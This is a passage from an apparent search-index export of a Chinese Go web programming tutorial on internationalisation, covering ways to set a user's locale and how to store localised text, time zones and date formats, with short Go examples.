<p>\u76ee\u524d\uff0cGo\u8bed\u8a00\u7684\u6807\u51c6\u5305\u6ca1\u6709\u63d0\u4f9b\u5bf9i18n\u7684\u652f\u6301\uff0c\u4f46\u6709\u4e00\u4e9b\u6bd4\u8f83\u7b80\u5355\u7684\u7b2c\u4e09\u65b9\u5b9e\u73b0\uff0c\u8fd9\u4e00\u7ae0\u6211\u4eec\u5c06\u5b9e\u73b0\u4e00\u4e2ago-i18n\u5e93\uff0c\u7528\u6765\u652f\u6301Go\u8bed\u8a00\u7684i18n\u3002</p> <p>\u6240\u8c13\u7684\u56fd\u9645\u5316\uff1a\u5c31\u662f\u6839\u636e\u7279\u5b9a\u7684locale\u4fe1\u606f\uff0c\u63d0\u53d6\u4e0e\u4e4b\u76f8\u5e94\u7684\u5b57\u7b26\u4e32\u6216\u5176\u5b83\u4e00\u4e9b\u4e1c\u897f\uff08\u6bd4\u5982\u65f6\u95f4\u548c\u8d27\u5e01\u7684\u683c\u5f0f\uff09\u7b49\u7b49\u3002\u8fd9\u6d89\u53ca\u5230\u4e09\u4e2a\u95ee\u9898\uff1a</p> <p>1\u3001\u5982\u4f55\u786e\u5b9alocale\u3002</p> <p>2\u3001\u5982\u4f55\u4fdd\u5b58\u4e0elocale\u76f8\u5173\u7684\u5b57\u7b26\u4e32\u6216\u5176\u5b83\u4fe1\u606f\u3002</p> <p>3\u3001\u5982\u4f55\u6839\u636elocale\u63d0\u53d6\u5b57\u7b26\u4e32\u548c\u5176\u5b83\u76f8\u5e94\u7684\u4fe1\u606f\u3002</p> <p>\u5728\u7b2c\u4e00\u5c0f\u8282\u91cc\uff0c\u6211\u4eec\u5c06\u4ecb\u7ecd\u5982\u4f55\u8bbe\u7f6e\u6b63\u786e\u7684locale\u4ee5\u4fbf\u8ba9\u8bbf\u95ee\u7ad9\u70b9\u7684\u7528\u6237\u80fd\u591f\u83b7\u5f97\u4e0e\u5176\u8bed\u8a00\u76f8\u5e94\u7684\u9875\u9762\u3002\u7b2c\u4e8c\u5c0f\u8282\u5c06\u4ecb\u7ecd\u5982\u4f55\u5904\u7406\u6216\u5b58\u50a8\u5b57\u7b26\u4e32\u3001\u8d27\u5e01\u3001\u65f6\u95f4\u65e5\u671f\u7b49\u4e0elocale\u76f8\u5173\u7684\u4fe1\u606f\uff0c\u7b2c\u4e09\u5c0f\u8282\u5c06\u4ecb\u7ecd\u5982\u4f55\u5b9e\u73b0\u56fd\u9645\u5316\u7ad9\u70b9\uff0c\u5373\u5982\u4f55\u6839\u636e\u4e0d\u540clocale\u8fd4\u56de\u4e0d\u540c\u5408\u9002\u7684\u5185\u5bb9\u3002\u901a\u8fc7\u8fd9\u4e09\u4e2a\u5c0f\u8282\u7684\u5b66\u4e60\uff0c\u6211\u4eec\u5c06\u83b7\u5f97\u4e00\u4e2a\u5b8c\u6574\u7684i18n\u65b9\u6848\u3002</p>"},{"location":"10.0/#_1","title":"\u76ee\u5f55","text":""},{"location":"10.0/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u7b2c\u4e5d\u7ae0\u603b\u7ed3</li> <li>\u4e0b\u4e00\u8282: \u8bbe\u7f6e\u9ed8\u8ba4\u5730\u533a</li> </ul>"},{"location":"10.1/","title":"10.1 \u8bbe\u7f6e\u9ed8\u8ba4\u5730\u533a","text":""},{"location":"10.1/#locale","title":"\u4ec0\u4e48\u662fLocale","text":"<p>Locale\u662f\u4e00\u7ec4\u63cf\u8ff0\u4e16\u754c\u4e0a\u67d0\u4e00\u7279\u5b9a\u533a\u57df\u6587\u672c\u683c\u5f0f\u548c\u8bed\u8a00\u4e60\u60ef\u7684\u8bbe\u7f6e\u7684\u96c6\u5408\u3002locale\u540d\u901a\u5e38\u7531\u4e09\u4e2a\u90e8\u5206\u7ec4\u6210\uff1a\u7b2c\u4e00\u90e8\u5206\uff0c\u662f\u4e00\u4e2a\u5f3a\u5236\u6027\u7684\uff0c\u8868\u793a\u8bed\u8a00\u7684\u7f29\u5199\uff0c\u4f8b\u5982\"en\"\u8868\u793a\u82f1\u6587\u6216\"zh\"\u8868\u793a\u4e2d\u6587\u3002\u7b2c\u4e8c\u90e8\u5206\uff0c\u8ddf\u5728\u4e00\u4e2a\u4e0b\u5212\u7ebf\u4e4b\u540e\uff0c\u662f\u4e00\u4e2a\u53ef\u9009\u7684\u56fd\u5bb6\u8bf4\u660e\u7b26\uff0c\u7528\u4e8e\u533a\u5206\u8bb2\u540c\u4e00\u79cd\u8bed\u8a00\u7684\u4e0d\u540c\u56fd\u5bb6\uff0c\u4f8b\u5982\"en_US\"\u8868\u793a\u7f8e\u56fd\u82f1\u8bed\uff0c\u800c\"en_UK\"\u8868\u793a\u82f1\u56fd\u82f1\u8bed\u3002\u6700\u540e\u4e00\u90e8\u5206\uff0c\u8ddf\u5728\u4e00\u4e2a\u53e5\u70b9\u4e4b\u540e\uff0c\u662f\u53ef\u9009\u7684\u5b57\u7b26\u96c6\u8bf4\u660e\u7b26\uff0c\u4f8b\u5982\"zh_CN.gb2312\"\u8868\u793a\u4e2d\u56fd\u4f7f\u7528gb2312\u5b57\u7b26\u96c6\u3002</p> <p>GO\u8bed\u8a00\u9ed8\u8ba4\u91c7\u7528\"UTF-8\"\u7f16\u7801\u96c6\uff0c\u6240\u4ee5\u6211\u4eec\u5b9e\u73b0i18n\u65f6\u4e0d\u8003\u8651\u7b2c\u4e09\u90e8\u5206\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u90fd\u91c7\u7528locale\u63cf\u8ff0\u7684\u524d\u9762\u4e24\u90e8\u5206\u6765\u4f5c\u4e3ai18n\u6807\u51c6\u7684locale\u540d\u3002</p> <p>\u5728Linux\u548cSolaris\u7cfb\u7edf\u4e2d\u53ef\u4ee5\u901a\u8fc7<code>locale -a</code>\u547d\u4ee4\u5217\u4e3e\u6240\u6709\u652f\u6301\u7684\u5730\u533a\u540d\uff0c\u8bfb\u8005\u53ef\u4ee5\u770b\u5230\u8fd9\u4e9b\u5730\u533a\u540d\u7684\u547d\u540d\u89c4\u8303\u3002\u5bf9\u4e8eBSD\u7b49\u7cfb\u7edf\uff0c\u6ca1\u6709locale\u547d\u4ee4\uff0c\u4f46\u662f\u5730\u533a\u4fe1\u606f\u5b58\u50a8\u5728/usr/share/locale\u4e2d\u3002</p>"},{"location":"10.1/#locale_1","title":"\u8bbe\u7f6eLocale","text":"<p>\u6709\u4e86\u4e0a\u9762\u5bf9locale\u7684\u5b9a\u4e49\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u9700\u8981\u6839\u636e\u7528\u6237\u7684\u4fe1\u606f(\u8bbf\u95ee\u4fe1\u606f\u3001\u4e2a\u4eba\u4fe1\u606f\u3001\u8bbf\u95ee\u57df\u540d\u7b49)\u6765\u8bbe\u7f6e\u4e0e\u4e4b\u76f8\u5173\u7684locale\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u51e0\u79cd\u65b9\u5f0f\u6765\u8bbe\u7f6e\u7528\u6237\u7684locale\u3002</p>"},{"location":"10.1/#locale_2","title":"\u901a\u8fc7\u57df\u540d\u8bbe\u7f6eLocale","text":"<p>\u8bbe\u7f6eLocale\u7684\u529e\u6cd5\u4e4b\u4e00\u662f\u5728\u5e94\u7528\u8fd0\u884c\u7684\u65f6\u5019\u91c7\u7528\u57df\u540d\u5206\u7ea7\u7684\u65b9\u5f0f\uff0c\u4f8b\u5982\uff0c\u6211\u4eec\u91c7\u7528 www.asta.com \u5f53\u505a\u6211\u4eec\u7684\u82f1\u6587\u7ad9(\u9ed8\u8ba4\u7ad9)\uff0c\u800c\u628a\u57df\u540d www.asta.cn \u5f53\u505a\u4e2d\u6587\u7ad9\u3002\u8fd9\u6837\u901a\u8fc7\u5728\u5e94\u7528\u91cc\u9762\u8bbe\u7f6e\u57df\u540d\u548c\u76f8\u5e94\u7684locale\u7684\u5bf9\u5e94\u5173\u7cfb\uff0c\u5c31\u53ef\u4ee5\u8bbe\u7f6e\u597d\u5730\u533a\u3002\u8fd9\u6837\u5904\u7406\u6709\u51e0\u70b9\u597d\u5904\uff1a</p> <ul> <li>\u901a\u8fc7URL\u5c31\u53ef\u4ee5\u5f88\u660e\u663e\u7684\u8bc6\u522b</li> <li>\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u57df\u540d\u5f88\u76f4\u89c2\u7684\u77e5\u9053\u5c06\u8bbf\u95ee\u90a3\u79cd\u8bed\u8a00\u7684\u7ad9\u70b9</li> <li>\u5728Go\u7a0b\u5e8f\u4e2d\u5b9e\u73b0\u975e\u5e38\u7684\u7b80\u5355\u65b9\u4fbf\uff0c\u901a\u8fc7\u4e00\u4e2amap\u5c31\u53ef\u4ee5\u5b9e\u73b0</li> <li>\u6709\u5229\u4e8e\u641c\u7d22\u5f15\u64ce\u6293\u53d6\uff0c\u80fd\u591f\u63d0\u9ad8\u7ad9\u70b9\u7684SEO</li> </ul> <p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684\u4ee3\u7801\u6765\u5b9e\u73b0\u57df\u540d\u7684\u5bf9\u5e94locale\uff1a <pre><code>if r.Host == \"www.asta.com\" {\ni18n.SetLocale(\"en\")\n} else if r.Host == \"www.asta.cn\" {\ni18n.SetLocale(\"zh-CN\")\n} else if r.Host == \"www.asta.tw\" {\ni18n.SetLocale(\"zh-TW\")\n}\n</code></pre> \u5f53\u7136\u9664\u4e86\u6574\u57df\u540d\u8bbe\u7f6e\u5730\u533a\u4e4b\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u901a\u8fc7\u5b50\u57df\u540d\u6765\u8bbe\u7f6e\u5730\u533a\uff0c\u4f8b\u5982\"en.asta.com\"\u8868\u793a\u82f1\u6587\u7ad9\u70b9\uff0c\"cn.asta.com\"\u8868\u793a\u4e2d\u6587\u7ad9\u70b9\u3002\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\u6240\u793a\uff1a <pre><code>prefix := strings.Split(r.Host,\".\")\n\nif prefix[0] == \"en\" {\ni18n.SetLocale(\"en\")\n} else if prefix[0] == \"cn\" {\ni18n.SetLocale(\"zh-CN\")\n} else if prefix[0] == \"tw\" {\ni18n.SetLocale(\"zh-TW\")\n}\n</code></pre> \u901a\u8fc7\u57df\u540d\u8bbe\u7f6eLocale\u6709\u5982\u4e0a\u6240\u793a\u7684\u4f18\u70b9\uff0c\u4f46\u662f\u6211\u4eec\u4e00\u822c\u5f00\u53d1Web\u5e94\u7528\u7684\u65f6\u5019\u4e0d\u4f1a\u91c7\u7528\u8fd9\u79cd\u65b9\u5f0f\uff0c\u56e0\u4e3a\u9996\u5148\u57df\u540d\u6210\u672c\u6bd4\u8f83\u9ad8\uff0c\u5f00\u53d1\u4e00\u4e2aLocale\u5c31\u9700\u8981\u4e00\u4e2a\u57df\u540d\uff0c\u800c\u4e14\u5f80\u5f80\u7edf\u4e00\u540d\u79f0\u7684\u57df\u540d\u4e0d\u4e00\u5b9a\u80fd\u7533\u8bf7\u7684\u5230\uff0c\u5176\u6b21\u6211\u4eec\u4e0d\u613f\u610f\u4e3a\u6bcf\u4e2a\u7ad9\u70b9\u53bb\u672c\u5730\u5316\u4e00\u4e2a\u914d\u7f6e\uff0c\u800c\u66f4\u591a\u7684\u662f\u91c7\u7528url\u540e\u9762\u5e26\u53c2\u6570\u7684\u65b9\u5f0f\uff0c\u8bf7\u770b\u4e0b\u9762\u7684\u4ecb\u7ecd\u3002</p>"},{"location":"10.1/#locale_3","title":"\u4ece\u57df\u540d\u53c2\u6570\u8bbe\u7f6eLocale","text":"<p>\u76ee\u524d\u6700\u5e38\u7528\u7684\u8bbe\u7f6eLocale\u7684\u65b9\u5f0f\u662f\u5728URL\u91cc\u9762\u5e26\u4e0a\u53c2\u6570\uff0c\u4f8b\u5982 www.asta.com/hello?locale=zh \u6216\u8005 www.asta.com/zh/hello \u3002\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u8bbe\u7f6e\u5730\u533a\uff1a<code>i18n.SetLocale(params[\"locale\"])</code>\u3002</p> <p>\u8fd9\u79cd\u8bbe\u7f6e\u65b9\u5f0f\u51e0\u4e4e\u62e5\u6709\u524d\u9762\u8bb2\u7684\u901a\u8fc7\u57df\u540d\u8bbe\u7f6eLocale\u7684\u6240\u6709\u4f18\u70b9\uff0c\u5b83\u91c7\u7528RESTful\u7684\u65b9\u5f0f\uff0c\u4ee5\u4f7f\u5f97\u6211\u4eec\u4e0d\u9700\u8981\u589e\u52a0\u989d\u5916\u7684\u65b9\u6cd5\u6765\u5904\u7406\u3002\u4f46\u662f\u8fd9\u79cd\u65b9\u5f0f\u9700\u8981\u5728\u6bcf\u4e00\u4e2a\u7684link\u91cc\u9762\u589e\u52a0\u76f8\u5e94\u7684\u53c2\u6570locale\uff0c\u8fd9\u4e5f\u8bb8\u6709\u70b9\u590d\u6742\u800c\u4e14\u6709\u65f6\u5019\u751a\u81f3\u76f8\u5f53\u7684\u7e41\u7410\u3002\u4e0d\u8fc7\u6211\u4eec\u53ef\u4ee5\u5199\u4e00\u4e2a\u901a\u7528\u7684\u51fd\u6570url\uff0c\u8ba9\u6240\u6709\u7684link\u5730\u5740\u90fd\u901a\u8fc7\u8fd9\u4e2a\u51fd\u6570\u6765\u751f\u6210\uff0c\u7136\u540e\u5728\u8fd9\u4e2a\u51fd\u6570\u91cc\u9762\u589e\u52a0<code>locale=params[\"locale\"]</code>\u53c2\u6570\u6765\u7f13\u89e3\u4e00\u4e0b\u3002</p> <p>\u4e5f\u8bb8\u6211\u4eec\u5e0c\u671bURL\u5730\u5740\u770b\u4e0a\u53bb\u66f4\u52a0\u7684RESTful\u4e00\u70b9\uff0c\u4f8b\u5982\uff1awww.asta.com/en/books (\u82f1\u6587\u7ad9\u70b9)\u548c www.asta.com/zh/books (\u4e2d\u6587\u7ad9\u70b9)\uff0c\u8fd9\u79cd\u65b9\u5f0f\u7684URL\u66f4\u52a0\u6709\u5229\u4e8eSEO\uff0c\u800c\u4e14\u5bf9\u4e8e\u7528\u6237\u4e5f\u6bd4\u8f83\u53cb\u597d\uff0c\u80fd\u591f\u901a\u8fc7URL\u76f4\u89c2\u7684\u77e5\u9053\u8bbf\u95ee\u7684\u7ad9\u70b9\u3002\u90a3\u4e48\u8fd9\u6837\u7684URL\u5730\u5740\u53ef\u4ee5\u901a\u8fc7router\u6765\u83b7\u53d6locale(\u53c2\u8003REST\u5c0f\u8282\u91cc\u9762\u4ecb\u7ecd\u7684router\u63d2\u4ef6\u5b9e\u73b0)\uff1a <pre><code>mux.Get(\"/:locale/books\", listbook)\n</code></pre></p>"},{"location":"10.1/#_1","title":"\u4ece\u5ba2\u6237\u7aef\u8bbe\u7f6e\u5730\u533a","text":"<p>\u5728\u4e00\u4e9b\u7279\u6b8a\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u9700\u8981\u6839\u636e\u5ba2\u6237\u7aef\u7684\u4fe1\u606f\u800c\u4e0d\u662f\u901a\u8fc7URL\u6765\u8bbe\u7f6eLocale\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u6765\u81ea\u4e8e\u5ba2\u6237\u7aef\u8bbe\u7f6e\u7684\u559c\u597d\u8bed\u8a00(\u6d4f\u89c8\u5668\u4e2d\u8bbe\u7f6e)\uff0c\u7528\u6237\u7684IP\u5730\u5740\uff0c\u7528\u6237\u5728\u6ce8\u518c\u7684\u65f6\u5019\u586b\u5199\u7684\u6240\u5728\u5730\u4fe1\u606f\u7b49\u3002\u8fd9\u79cd\u65b9\u5f0f\u6bd4\u8f83\u9002\u5408Web\u4e3a\u57fa\u7840\u7684\u5e94\u7528\u3002</p> <ul> <li>Accept-Language</li> </ul> <p>\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u65f6\u5019\u5728HTTP\u5934\u4fe1\u606f\u91cc\u9762\u6709<code>Accept-Language</code>\uff0c\u4e00\u822c\u7684\u5ba2\u6237\u7aef\u90fd\u4f1a\u8bbe\u7f6e\u8be5\u4fe1\u606f\uff0c\u4e0b\u9762\u662fGo\u8bed\u8a00\u5b9e\u73b0\u7684\u4e00\u4e2a\u7b80\u5355\u7684\u6839\u636e<code>Accept-Language</code>\u5b9e\u73b0\u8bbe\u7f6e\u5730\u533a\u7684\u4ee3\u7801\uff1a <pre><code>AL := r.Header.Get(\"Accept-Language\")\nif AL == \"en\" {\ni18n.SetLocale(\"en\")\n} else if AL == \"zh-CN\" {\ni18n.SetLocale(\"zh-CN\")\n} else if AL == \"zh-TW\" {\ni18n.SetLocale(\"zh-TW\")\n}\n</code></pre> \u5f53\u7136\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\uff0c\u53ef\u80fd\u9700\u8981\u66f4\u52a0\u4e25\u683c\u7684\u5224\u65ad\u6765\u8fdb\u884c\u8bbe\u7f6e\u5730\u533a - IP\u5730\u5740</p> <pre><code>\u53e6\u4e00\u79cd\u6839\u636e\u5ba2\u6237\u7aef\u6765\u8bbe\u5b9a\u5730\u533a\u5c31\u662f\u7528\u6237\u8bbf\u95ee\u7684IP\uff0c\u6211\u4eec\u6839\u636e\u76f8\u5e94\u7684IP\u5e93\uff0c\u5bf9\u5e94\u8bbf\u95ee\u7684IP\u5230\u5730\u533a\uff0c\u76ee\u524d\u5168\u7403\u6bd4\u8f83\u5e38\u7528\u7684\u5c31\u662fGeoIP Lite Country\u8fd9\u4e2a\u5e93\u3002\u8fd9\u79cd\u8bbe\u7f6e\u5730\u533a\u7684\u673a\u5236\u975e\u5e38\u7b80\u5355\uff0c\u6211\u4eec\u53ea\u9700\u8981\u6839\u636eIP\u6570\u636e\u5e93\u67e5\u8be2\u7528\u6237\u7684IP\u7136\u540e\u8fd4\u56de\u56fd\u5bb6\u5730\u533a\uff0c\u6839\u636e\u8fd4\u56de\u7684\u7ed3\u679c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u5730\u533a\u3002\n</code></pre> <ul> <li> <p>\u7528\u6237profile</p> <p>\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u8ba9\u7528\u6237\u6839\u636e\u4f60\u63d0\u4f9b\u7684\u4e0b\u62c9\u83dc\u5355\u6216\u8005\u522b\u7684\u4ec0\u4e48\u65b9\u5f0f\u7684\u8bbe\u7f6e\u76f8\u5e94\u7684locale\uff0c\u7136\u540e\u6211\u4eec\u5c06\u7528\u6237\u8f93\u5165\u7684\u4fe1\u606f\uff0c\u4fdd\u5b58\u5230\u4e0e\u5b83\u5e10\u53f7\u76f8\u5173\u7684profile\u4e2d\uff0c\u5f53\u7528\u6237\u518d\u6b21\u767b\u9646\u7684\u65f6\u5019\u628a\u8fd9\u4e2a\u8bbe\u7f6e\u590d\u5199\u5230locale\u8bbe\u7f6e\u4e2d\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4fdd\u8bc1\u8be5\u7528\u6237\u6bcf\u6b21\u8bbf\u95ee\u90fd\u662f\u57fa\u4e8e\u81ea\u5df1\u5148\u524d\u8bbe\u7f6e\u7684locale\u6765\u83b7\u5f97\u9875\u9762\u3002</p> </li> </ul>"},{"location":"10.1/#_2","title":"\u603b\u7ed3","text":"<p>\u901a\u8fc7\u4e0a\u9762\u7684\u4ecb\u7ecd\u53ef\u77e5\uff0c\u8bbe\u7f6eLocale\u53ef\u4ee5\u6709\u5f88\u591a\u79cd\u65b9\u5f0f\uff0c\u6211\u4eec\u5e94\u8be5\u6839\u636e\u9700\u6c42\u7684\u4e0d\u540c\u6765\u9009\u62e9\u4e0d\u540c\u7684\u8bbe\u7f6eLocale\u7684\u65b9\u6cd5\uff0c\u4ee5\u8ba9\u7528\u6237\u80fd\u4ee5\u5b83\u6700\u719f\u6089\u7684\u65b9\u5f0f\uff0c\u83b7\u5f97\u6211\u4eec\u63d0\u4f9b\u7684\u670d\u52a1\uff0c\u63d0\u9ad8\u5e94\u7528\u7684\u7528\u6237\u53cb\u597d\u6027\u3002</p>"},{"location":"10.1/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u56fd\u9645\u5316\u548c\u672c\u5730\u5316</li> <li>\u4e0b\u4e00\u8282: \u672c\u5730\u5316\u8d44\u6e90</li> </ul>"},{"location":"10.2/","title":"10.2 \u672c\u5730\u5316\u8d44\u6e90","text":""},{"location":"10.2/#102","title":"10.2 \u672c\u5730\u5316\u8d44\u6e90","text":"<p>\u524d\u9762\u5c0f\u8282\u6211\u4eec\u4ecb\u7ecd\u4e86\u5982\u4f55\u8bbe\u7f6eLocale\uff0c\u8bbe\u7f6e\u597dLocale\u4e4b\u540e\u6211\u4eec\u9700\u8981\u89e3\u51b3\u7684\u95ee\u9898\u5c31\u662f\u5982\u4f55\u5b58\u50a8\u76f8\u5e94\u7684Locale\u5bf9\u5e94\u7684\u4fe1\u606f\u5462\uff1f\u8fd9\u91cc\u9762\u7684\u4fe1\u606f\u5305\u62ec\uff1a\u6587\u672c\u4fe1\u606f\u3001\u65f6\u95f4\u548c\u65e5\u671f\u3001\u8d27\u5e01\u503c\u3001\u56fe\u7247\u3001\u5305\u542b\u6587\u4ef6\u4ee5\u53ca\u89c6\u56fe\u7b49\u8d44\u6e90\u3002\u90a3\u4e48\u63a5\u4e0b\u6765\u6211\u4eec\u5c06\u5bf9\u8fd9\u4e9b\u4fe1\u606f\u4e00\u4e00\u8fdb\u884c\u4ecb\u7ecd\uff0cGo\u8bed\u8a00\u4e2d\u6211\u4eec\u628a\u8fd9\u4e9b\u683c\u5f0f\u4fe1\u606f\u5b58\u50a8\u5728JSON\u4e2d\uff0c\u7136\u540e\u901a\u8fc7\u5408\u9002\u7684\u65b9\u5f0f\u5c55\u73b0\u51fa\u6765\u3002(\u63a5\u4e0b\u6765\u4ee5\u4e2d\u6587\u548c\u82f1\u6587\u4e24\u79cd\u8bed\u8a00\u5bf9\u6bd4\u4e3e\u4f8b,\u5b58\u50a8\u683c\u5f0f\u6587\u4ef6en.json\u548czh-CN.json)</p>"},{"location":"10.2/#_1","title":"\u672c\u5730\u5316\u6587\u672c\u6d88\u606f","text":"<p>\u6587\u672c\u4fe1\u606f\u662f\u7f16\u5199Web\u5e94\u7528\u4e2d\u6700\u5e38\u7528\u5230\u7684\uff0c\u4e5f\u662f\u672c\u5730\u5316\u8d44\u6e90\u4e2d\u6700\u591a\u7684\u4fe1\u606f\uff0c\u60f3\u8981\u4ee5\u9002\u5408\u672c\u5730\u8bed\u8a00\u7684\u65b9\u5f0f\u6765\u663e\u793a\u6587\u672c\u4fe1\u606f\uff0c\u53ef\u884c\u7684\u4e00\u79cd\u65b9\u6848\u662f:\u5efa\u7acb\u9700\u8981\u7684\u8bed\u8a00\u76f8\u5e94\u7684map\u6765\u7ef4\u62a4\u4e00\u4e2akey-value\u7684\u5173\u7cfb\uff0c\u5728\u8f93\u51fa\u4e4b\u524d\u6309\u9700\u4ece\u9002\u5408\u7684map\u4e2d\u53bb\u83b7\u53d6\u76f8\u5e94\u7684\u6587\u672c\uff0c\u5982\u4e0b\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u793a\u4f8b\uff1a</p> <p><pre><code>package main\n\nimport \"fmt\"\n\nvar locales map[string]map[string]string\n\nfunc main() {\nlocales = make(map[string]map[string]string, 2)\nen := make(map[string]string, 10)\nen[\"pea\"] = \"pea\"\nen[\"bean\"] = \"bean\"\nlocales[\"en\"] = en\ncn := make(map[string]string, 10)\ncn[\"pea\"] = \"\u8c4c\u8c46\"\ncn[\"bean\"] = \"\u6bdb\u8c46\"\nlocales[\"zh-CN\"] = cn\nlang := \"zh-CN\"\nfmt.Println(msg(lang, \"pea\"))\nfmt.Println(msg(lang, \"bean\"))\n}\n\nfunc msg(locale, key string) string {\nif v, ok := locales[locale]; ok {\nif v2, ok := v[key]; ok {\nreturn v2\n}\n}\nreturn \"\"\n}\n</code></pre> \u4e0a\u9762\u793a\u4f8b\u6f14\u793a\u4e86\u4e0d\u540clocale\u7684\u6587\u672c\u7ffb\u8bd1\uff0c\u5b9e\u73b0\u4e86\u4e2d\u6587\u548c\u82f1\u6587\u5bf9\u4e8e\u540c\u4e00\u4e2akey\u663e\u793a\u4e0d\u540c\u8bed\u8a00\u7684\u5b9e\u73b0\uff0c\u4e0a\u9762\u5b9e\u73b0\u4e86\u4e2d\u6587\u7684\u6587\u672c\u6d88\u606f\uff0c\u5982\u679c\u60f3\u5207\u6362\u5230\u82f1\u6587\u7248\u672c\uff0c\u53ea\u9700\u8981\u628alang\u8bbe\u7f6e\u4e3aen\u5373\u53ef\u3002</p> <p>\u6709\u4e9b\u65f6\u5019\u4ec5\u662fkey-value\u66ff\u6362\u662f\u4e0d\u80fd\u6ee1\u8db3\u9700\u8981\u7684\uff0c\u4f8b\u5982\"I am 30 years old\",\u4e2d\u6587\u8868\u8fbe\u662f\"\u6211\u4eca\u5e7430\u5c81\u4e86\"\uff0c\u800c\u6b64\u5904\u768430\u662f\u4e00\u4e2a\u53d8\u91cf\uff0c\u8be5\u600e\u4e48\u529e\u5462\uff1f\u8fd9\u4e2a\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u4ee5\u7ed3\u5408<code>fmt.Printf</code>\u51fd\u6570\u6765\u5b9e\u73b0\uff0c\u8bf7\u770b\u4e0b\u9762\u7684\u4ee3\u7801\uff1a <pre><code>en[\"how old\"] =\"I am %d years old\"\ncn[\"how old\"] =\"\u6211\u4eca\u5e74%d\u5c81\u4e86\"\n\nfmt.Printf(msg(lang, \"how old\"), 30)\n</code></pre> \u4e0a\u9762\u7684\u793a\u4f8b\u4ee3\u7801\u4ec5\u7528\u4ee5\u6f14\u793a\u5185\u90e8\u7684\u5b9e\u73b0\u65b9\u6848\uff0c\u800c\u5b9e\u9645\u6570\u636e\u662f\u5b58\u50a8\u5728JSON\u91cc\u9762\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7<code>json.Unmarshal</code>\u6765\u4e3a\u76f8\u5e94\u7684map\u586b\u5145\u6570\u636e\u3002</p>"},{"location":"10.2/#_2","title":"\u672c\u5730\u5316\u65e5\u671f\u548c\u65f6\u95f4","text":"<p>\u56e0\u4e3a\u65f6\u533a\u7684\u5173\u7cfb\uff0c\u540c\u4e00\u65f6\u523b\uff0c\u5728\u4e0d\u540c\u7684\u5730\u533a\uff0c\u8868\u793a\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u800c\u4e14\u56e0\u4e3aLocale\u7684\u5173\u7cfb\uff0c\u65f6\u95f4\u683c\u5f0f\u4e5f\u4e0d\u5c3d\u76f8\u540c\uff0c\u4f8b\u5982\u4e2d\u6587\u73af\u5883\u4e0b\u53ef\u80fd\u663e\u793a\uff1a<code>2012\u5e7410\u670824\u65e5 \u661f\u671f\u4e09 23\u65f611\u520613\u79d2 CST</code>\uff0c\u800c\u5728\u82f1\u6587\u73af\u5883\u4e0b\u53ef\u80fd\u663e\u793a:<code>Wed Oct 24 23:11:13 CST 2012</code>\u3002\u8fd9\u91cc\u9762\u6211\u4eec\u9700\u8981\u89e3\u51b3\u4e24\u70b9:</p> <ol> <li>\u65f6\u533a\u95ee\u9898</li> <li>\u683c\u5f0f\u95ee\u9898</li> </ol> <p>$GOROOT/lib/time\u5305\u4e2d\u7684timeinfo.zip\u542b\u6709locale\u5bf9\u5e94\u7684\u65f6\u533a\u7684\u5b9a\u4e49\uff0c\u4e3a\u4e86\u83b7\u5f97\u5bf9\u5e94\u4e8e\u5f53\u524dlocale\u7684\u65f6\u95f4\uff0c\u6211\u4eec\u5e94\u9996\u5148\u4f7f\u7528<code>time.LoadLocation(name string)</code>\u83b7\u53d6\u76f8\u5e94\u4e8e\u5730\u533a\u7684locale\uff0c\u6bd4\u5982<code>Asia/Shanghai</code>\u6216<code>America/Chicago</code>\u5bf9\u5e94\u7684\u65f6\u533a\u4fe1\u606f\uff0c\u7136\u540e\u518d\u5229\u7528\u6b64\u4fe1\u606f\u4e0e\u8c03\u7528<code>time.Now</code>\u83b7\u5f97\u7684Time\u5bf9\u8c61\u534f\u4f5c\u6765\u83b7\u5f97\u6700\u7ec8\u7684\u65f6\u95f4\u3002\u8be6\u7ec6\u7684\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50(\u8be5\u4f8b\u5b50\u91c7\u7528\u4e0a\u9762\u4f8b\u5b50\u7684\u4e00\u4e9b\u53d8\u91cf):</p> <p><pre><code>en[\"time_zone\"]=\"America/Chicago\"\ncn[\"time_zone\"]=\"Asia/Shanghai\"\n\nloc,_:=time.LoadLocation(msg(lang,\"time_zone\"))\nt:=time.Now()\nt = t.In(loc)\nfmt.Println(t.Format(time.RFC3339))\n</code></pre> \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7c7b\u4f3c\u5904\u7406\u6587\u672c\u683c\u5f0f\u7684\u65b9\u5f0f\u6765\u89e3\u51b3\u65f6\u95f4\u683c\u5f0f\u7684\u95ee\u9898\uff0c\u4e3e\u4f8b\u5982\u4e0b: <pre><code>en[\"date_format\"]=\"%Y-%m-%d %H:%M:%S\"\ncn[\"date_format\"]=\"%Y\u5e74%m\u6708%d\u65e5 %H\u65f6%M\u5206%S\u79d2\"\n\nfmt.Println(date(msg(lang,\"date_format\"),t))\n\nfunc date(fomate string,t time.Time) string{\nyear, month, day = t.Date()\nhour, min, sec = t.Clock()\n//\u89e3\u6790\u76f8\u5e94\u7684%Y %m %d %H %M %S\u7136\u540e\u8fd4\u56de\u4fe1\u606f\n//%Y \u66ff\u6362\u62102012\n//%m \u66ff\u6362\u621010\n//%d 